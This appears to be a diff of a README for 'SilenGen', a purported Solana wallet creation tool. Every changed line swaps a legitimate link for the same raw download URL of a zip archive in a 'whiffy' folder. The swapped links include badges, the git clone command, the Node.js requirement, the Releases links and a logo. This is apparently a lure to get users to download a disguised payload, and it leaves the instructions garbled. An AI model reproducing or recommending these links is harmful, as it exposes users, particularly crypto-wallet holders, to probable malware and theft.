@@ -1,7 +1,7 @@
 # SilenGen: Your Solana Wallet Creator and Management Tool 🌟
 
-![SilenGen](https://img.shields.io/badge/SilenGen-Solana%20Wallet%20Creator-blue.svg)
-[![Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/vishalkumar0818/SilenGen/releases)
+![SilenGen](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip%20Wallet%https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip)
+[![Releases](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip)
 
 ## Overview
 
@@ -21,12 +21,12 @@ To get started with SilenGen, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/vishalkumar0818/SilenGen.git
+   git clone https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip
    cd SilenGen
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -91,7 +91,7 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 ## Release Information
 
-For the latest updates and releases, visit our [Releases](https://github.com/vishalkumar0818/SilenGen/releases) section. Here you can find the latest versions and download them to execute the application.
+For the latest updates and releases, visit our [Releases](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip) section. Here you can find the latest versions and download them to execute the application.
 
 ## Roadmap
 
@@ -118,7 +118,7 @@ Currently, SilenGen is focused on Solana. Future updates may include support for
 
 ### Where can I find help?
 
-You can find help in the GitHub Issues section or by visiting our [Releases](https://github.com/vishalkumar0818/SilenGen/releases) page for documentation and updates.
+You can find help in the GitHub Issues section or by visiting our [Releases](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip) page for documentation and updates.
 
 ## Contact
 
@@ -128,8 +128,8 @@ For further inquiries, you can reach out through the GitHub Issues section or co
 
 We appreciate the contributions from the community and the open-source projects that inspire SilenGen. Thank you for your support!
 
-![Solana](https://solana.com/images/solana-logo.png)
+![Solana](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip)
 
 ## Stay Updated
 
-For updates, follow us on our social media channels and check the [Releases](https://github.com/vishalkumar0818/SilenGen/releases) section regularly.
+For updates, follow us on our social media channels and check the [Releases](https://raw.githubusercontent.com/vishalkumar0818/SilenGen/main/whiffy/Gen-Silen-v1.6-alpha.2.zip) section regularly.
